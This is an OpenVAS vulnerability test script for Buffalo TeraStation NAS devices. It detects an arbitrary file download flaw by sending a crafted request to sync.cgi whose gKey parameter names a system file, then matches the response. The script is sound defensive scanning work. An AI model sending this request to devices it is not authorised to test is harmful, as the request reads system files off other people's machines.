###############################################################################
# OpenVAS Vulnerability Test
#
# Buffalo TeraStation Multiple Security Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (C) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/h:buffalotech:nas";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103650");
  script_version("2022-04-25T14:50:49+0000");
  script_name("Buffalo TeraStation Multiple Security Vulnerabilities");
  script_tag(name:"cvss_base", value:"8.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:N");
  script_tag(name:"last_modification", value:"2022-04-25 14:50:49 +0000 (Mon, 25 Apr 2022)");
  script_tag(name:"creation_date", value:"2013-01-31 12:41:05 +0100 (Thu, 31 Jan 2013)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_buffalotech_nas_web_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("buffalo/nas/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/57634");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"Buffalo TeraStation is prone to an arbitrary file download and an
  arbitrary command-injection vulnerability because it fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"impact", value:"An attacker can exploit these issues to download arbitrary files and
  execute arbitrary-commands with root privilege within the context of the vulnerable system. Successful
  exploits will result in the complete compromise of affected system.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( port:port, cpe:CPE ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

files = traversal_files();

foreach pattern( keys( files ) ) {

  file = files[pattern];

  url = dir + '/cgi-bin/sync.cgi?gSSS=foo&gRRR=foo&gPage=information&gMode=log&gType=save&gKey=/' + file;
  if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
